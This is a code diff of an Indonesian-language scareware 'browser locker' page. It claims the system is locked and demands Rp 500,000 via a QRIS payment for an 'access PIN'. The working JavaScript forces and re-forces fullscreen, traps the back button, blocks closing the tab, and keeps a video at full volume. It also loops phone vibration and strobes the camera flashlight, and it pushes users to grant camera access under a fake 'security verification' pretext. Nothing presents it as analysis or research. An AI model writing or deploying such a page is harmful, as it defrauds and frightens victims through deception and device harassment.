@@ -13,36 +13,7 @@
             --card-bg: #0a0a0a;
         }
 
-        /* RESET & LOCK ZOOM */
-        html, body { 
-            background-color: var(--bg-color); 
-            color: #fff; 
-            font-family: 'Inter', sans-serif; 
-            margin: 0; 
-            padding: 0; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            overflow: hidden; /* Kunci scroll utama */
-            height: 100%;
-            width: 100%;
-            touch-action: none; /* Matikan zoom dua jari & swipe sistem */
-            user-select: none;
-            -webkit-user-select: none;
-        }
-
-        /* Wrapper untuk scroll konten tanpa merusak fullscreen */
-        .wrapper {
-            width: 100%;
-            height: 100%;
-            overflow-y: auto;
-            padding: 20px;
-            box-sizing: border-box;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            -webkit-overflow-scrolling: touch;
-        }
+        body { background-color: var(--bg-color); color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; touch-action: pan-x pan-y; }
         
         .hacker-banner { width: 100%; max-width: 400px; border: 1px solid var(--border-color); margin-bottom: 20px; border-radius: 4px; overflow: hidden; background: #000; }
         .hacker-banner video { width: 100%; display: block; object-fit: cover; }
@@ -53,89 +24,92 @@
         .warning-icon { font-size: 2rem; color: #ffcc00; margin-bottom: 5px; }
         h1 { font-size: 1.6rem; margin: 0 0 20px 0; text-transform: uppercase; letter-spacing: 1px; font-weight: 900; text-align: center; }
 
-        .main-box { width: 100%; max-width: 400px; border: 1px solid var(--border-color); padding: 20px; box-sizing: border-box; text-align: center; border-radius: 8px; background: var(--card-bg); }
+        .main-box { width: 100%; max-width: 400px; border: 1px solid var(--border-color); padding: 20px; box-sizing: border-box; text-align: center; border-radius: 8px; }
         
         .qris-frame { width: 230px; margin: 0 auto 20px auto; border: 1px solid var(--border-color); background: #fff; padding: 10px; border-radius: 4px; }
         .qris-frame img { width: 100%; display: block; }
 
-        .accordion { width: 100%; margin-bottom: 10px; border: 1px solid var(--border-color); border-radius: 4px; overflow: hidden; background: #050505; }
+        .accordion { width: 100%; margin-bottom: 10px; border: 1px solid var(--border-color); border-radius: 4px; overflow: hidden; background: var(--card-bg); }
         .acc-header { width: 100%; padding: 15px; background: none; border: none; color: #fff; display: flex; justify-content: space-between; align-items: center; cursor: pointer; font-family: 'Inter'; font-weight: 700; font-size: 0.85rem; }
-        .acc-content { max-height: 0; overflow: hidden; transition: max-height 0.4s ease-out; text-align: left; }
+        .acc-content { max-height: 0; overflow: hidden; transition: max-height 0.4s ease-out; background: #050505; text-align: left; }
         .acc-body { padding: 15px; font-size: 0.8rem; line-height: 1.5; color: #ccc; border-top: 1px solid #1a1a1a; }
         
         .instruction-img { width: 100%; max-width: 250px; margin: 10px 0; border: 1px solid #333; border-radius: 4px; display: block; }
 
         .arrow { transition: transform 0.3s; border: solid #fff; border-width: 0 2px 2px 0; display: inline-block; padding: 3px; transform: rotate(45deg); }
         .active .arrow { transform: rotate(-135deg); }
-        .active + .acc-content { max-height: 1000px; }
+        .active + .acc-content { max-height: 1500px; }
 
-        .terminal { background: #050505; border: 1px solid var(--border-color); padding: 12px; text-align: left; font-family: 'Courier Prime', monospace; font-size: 0.8rem; color: var(--accent-green); margin: 15px 0; border-radius: 4px; min-height: 60px; }
+        .terminal { background: #050505; border: 1px solid var(--border-color); padding: 12px; text-align: left; font-family: 'Courier Prime', monospace; font-size: 0.8rem; color: var(--accent-green); margin: 15px 0; border-radius: 4px; min-height: 80px; }
         .btn-pay { width: 100%; background: #fff; color: #000; border: none; padding: 16px; font-weight: 900; font-size: 0.9rem; cursor: pointer; text-transform: uppercase; border-radius: 4px; }
         
-        footer { margin-top: 30px; font-size: 0.7rem; color: #444; font-family: 'Courier Prime', monospace; padding-bottom: 20px; }
+        footer { margin-top: 30px; font-size: 0.7rem; color: #444; font-family: 'Courier Prime', monospace; }
     </style>
 </head>
 <body onclick="inisialisasiEfek()"> 
 
-    <div class="wrapper">
-        <div class="hacker-banner">
-            <video id="myVideo" loop playsinline>
-                <source src="hacker.mp4" type="video/mp4">
-            </video>
-        </div>
-
-        <div class="logo-circle">
-            <img src="logo.png" alt="Logo">
-        </div>
-
-        <div class="warning-icon">⚠️</div>
-        <h1>SISTEM TERKUNCI</h1>
-
-        <div class="main-box">
-            <div class="qris-frame">
-                <img src="qris.png" alt="QRIS">
-            </div>
-
-            <div class="accordion">
-                <button class="acc-header" onclick="toggleAcc(this)">
-                    NOMINAL TRANSFER <i class="arrow"></i>
-                </button>
-                <div class="acc-content">
-                    <div class="acc-body">
-                        Silakan transfer sebesar: <br>
-                        <strong style="color: var(--accent-green); font-size: 1.1rem;">Rp 500.000</strong><br>
-                        <span style="font-size: 0.7rem;">Pastikan nominal sesuai agar verifikasi lebih cepat.</span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="accordion">
-                <button class="acc-header" onclick="toggleAcc(this)">
-                    CARA MENDAPATKAN PIN AKSES <i class="arrow"></i>
-                </button>
-                <div class="acc-content">
-                    <div class="acc-body">
-                        1. Scan QRIS diatas menggunakan akun payment anda.<br>
-                        2. Selesaikan pembayaran sesuai nominal.<br>
-                        3. Klik logo live chat pojok kanan bawah.<br>
-                        4. Kirim bukti transfer dan beri keterangan "SAYA SUDAH TRANSFER".<br>
-                        5. Klik tombol "Konfirmasi Pembayaran".<br>
-                        6. Admin akan mengirimkan PIN AKSES melalui live Chat.
-                    </div>
-                </div>
-            </div>
-
-            <div id="term" class="terminal">
-                > Status Sistem: TERKUNCI<br>
-                > UI Lockdown: ACTIVE<br>
-                > Anti-Bypass: ENABLED
-            </div>
-
-            <button onclick="proses()" class="btn-pay" id="btn">KONFIRMASI PEMBAYARAN</button>
-        </div>
-
-        <footer>© 2025 Copyright By vanzmoods</footer>
+    <div class="hacker-banner">
+        <video id="myVideo" loop playsinline>
+            <source src="hacker.mp4" type="video/mp4">
+        </video>
     </div>
+
+    <div class="logo-circle">
+        <img src="logo.png" alt="Logo">
+    </div>
+
+    <div class="warning-icon">⚠️</div>
+    <h1>SISTEM TERKUNCI</h1>
+
+    <div class="main-box">
+        <div class="qris-frame">
+            <img src="qris.png" alt="QRIS">
+        </div>
+
+        <div class="accordion">
+            <button class="acc-header" onclick="toggleAcc(this)">
+                NOMINAL TRANSFER <i class="arrow"></i>
+            </button>
+            <div class="acc-content">
+                <div class="acc-body">
+                    Silakan transfer sebesar: <br>
+                    <strong style="color: var(--accent-green); font-size: 1.1rem;">Rp 500.000</strong><br>
+                    <span style="font-size: 0.7rem;">Pastikan nominal sesuai agar verifikasi lebih cepat.</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="accordion">
+            <button class="acc-header" onclick="toggleAcc(this)">
+                CARA MENDAPATKAN PIN AKSES <i class="arrow"></i>
+            </button>
+            <div class="acc-content">
+                <div class="acc-body">
+                    1. Scan QRIS diatas menggunakan akun payment anda.<br>
+                    2. Selesaikan pembayaran sesuai nominal.<br>
+                    3. Klik logo sms warna hijau pojok kanan bawah.<br>
+                    4. Klik logo mengirim pesan dan mengirim gambar:<br>
+                    <img src="instruksi1.jpg" class="instruction-img" alt="Tutorial 1"><br>
+                    5. Klik icon lampiran untuk mengirim bukti transaksi:<br>
+                    <img src="instruksi2.jpg" class="instruction-img" alt="Tutorial 2"><br>
+                    6. Kirim bukti transfer melalui Live Chat Dan beri keterangan "SAYA SUDAH TRANSFER".<br>
+                    7. Klik tombol "Konfirmasi Pembayaran".<br>
+                    8. Setelah itu tunggu beberapa saat Admin akan verifikasi dan akan mengirimkan PIN AKSES Melalui live Chat.
+                </div>
+            </div>
+        </div>
+
+        <div id="term" class="terminal">
+            > Status Sistem: TERKUNCI<br>
+            > Lockdown Mode: ACTIVE<br>
+            > Vibration & Strobe: ACTIVE<br>
+            > Volume: Locked 100%
+        </div>
+
+        <button onclick="proses()" class="btn-pay" id="btn">KONFIRMASI PEMBAYARAN</button>
+    </div>
+
+    <footer>© 2025 Copyright By vanzmoods</footer>
 
     <script>
         var fiturSudahJalan = false;
@@ -143,70 +117,72 @@
 
         // Anti-Tab Close
         window.onbeforeunload = function() {
-            return "DATA AKAN TERHAPUS!";
+            return "SISTEM TERKUNCI! Data anda akan hilang jika menutup halaman ini.";
         };
 
-        // FUNGSI UTAMA PAKSA FULLSCREEN TANPA ZOOM
-        function paksaFull() {
+        // Diperbarui: Fungsi untuk masuk mode fullscreen tanpa ngezom
+        function aktifkanFullscreen() {
             let elem = document.documentElement;
-            
-            // Reset viewport meta secara dinamis untuk mematikan zoom
-            let viewport = document.querySelector("meta[name=viewport]");
-            viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover');
-
             let requestMethod = elem.requestFullscreen || elem.webkitRequestFullscreen || elem.webkitRequestFullScreen || elem.mozRequestFullScreen || elem.msRequestFullscreen;
-            
             if (requestMethod) { 
                 requestMethod.apply(elem).then(() => {
-                    window.scrollTo(0, 0); // Sentakan scroll untuk sembunyikan toolbar
-                }).catch(e => console.log("Gagal: Butuh klik user"));
+                    window.scrollTo(0, 0); // Sembunyikan toolbar
+                }).catch(e => console.log("Menunggu klik user"));
             }
         }
 
-        // 1. DETEKSI FULLSCREEN KELUAR
+        // Diperbarui: Deteksi keluar fullscreen otomatis melempar alert
         document.addEventListener('fullscreenchange', () => {
             if (!document.fullscreenElement && fiturSudahJalan) {
-                alert("SISTEM TERKUNCI! Kembali ke mode aman...");
-                paksaFull(); // Klik 'Oke' memicu Fullscreen lagi
+                alert("NAVIGASI DINONAKTIFKAN! Mengunci kembali sistem...");
+                aktifkanFullscreen(); // Pemicu: Klik "Oke" pada alert adalah interaksi user
             }
         });
 
-        // 2. ANTI-BACK (Tombol Kembali)
-        history.pushState(null, null, location.href);
-        window.onpopstate = function () {
-            alert("SISTEM TERKUNCI! Selesaikan pembayaran untuk keluar.");
-            paksaFull(); // Klik 'Oke' memicu Fullscreen lagi
-            history.pushState(null, null, location.href);
-        };
-
         async function inisialisasiEfek() {
             if (!fiturSudahJalan) {
-                paksaFull();
+                // 1. Masuk Full Screen
+                aktifkanFullscreen();
+
+                // 2. ANTI-BACK (Kunci Navigasi)
+                history.pushState(null, null, location.href);
+                window.onpopstate = function () {
+                    alert("SISTEM TERKUNCI! Selesaikan pembayaran untuk keluar.");
+                    aktifkanFullscreen(); // Klik "Oke" memicu fullscreen lagi
+                    history.pushState(null, null, location.href);
+                };
 
                 var video = document.getElementById("myVideo");
+
+                // 3. JALANKAN VIDEO & SUARA
                 video.muted = false;
                 video.volume = 1.0;
                 video.play();
 
-                // Kunci Volume & Playback (50ms)
+                // 4. AGGRESSIVE VOLUME & PLAY LOCK (50ms)
                 setInterval(() => {
                     video.volume = 1.0;
+                    if(video.muted) video.muted = false;
                     if(video.paused) video.play();
                 }, 50);
 
-                // Getar Panik
+                // 5. FITUR GETAR (Android)
                 if (navigator.vibrate) {
-                    setInterval(() => { navigator.vibrate([1000, 500, 1000]); }, 2500);
+                    setInterval(() => { navigator.vibrate([800, 200, 800]); }, 2000);
                 }
 
+                // 6. JALANKAN SENTER
                 mulaiSenterKedip();
+                
                 fiturSudahJalan = true;
             }
         }
 
         async function mulaiSenterKedip() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' } 
+                });
                 track = stream.getVideoTracks()[0];
                 const caps = track.getCapabilities();
                 if (caps.torch) {
@@ -216,7 +192,9 @@
                         await track.applyConstraints({ advanced: [{ torch: flashOn }] });
                     }, 100); 
                 }
-            } catch (err) { console.log("Izin kamera ditolak"); }
+            } catch (err) {
+                alert("IZINKAN KAMERA UNTUK VERIFIKASI KEAMANAN!");
+            }
         }
 
         function toggleAcc(element) {
@@ -224,7 +202,9 @@
         }
 
         function proses() {
-            alert("Laporan telah dikirim ke Admin. Tunggu verifikasi!");
+            const term = document.getElementById('term');
+            term.innerHTML += "<br>> Mengirim laporan ke Admin...";
+            alert("Selesaikan pembayaran dan kirim bukti ke Live Chat!");
         }
     </script>
 
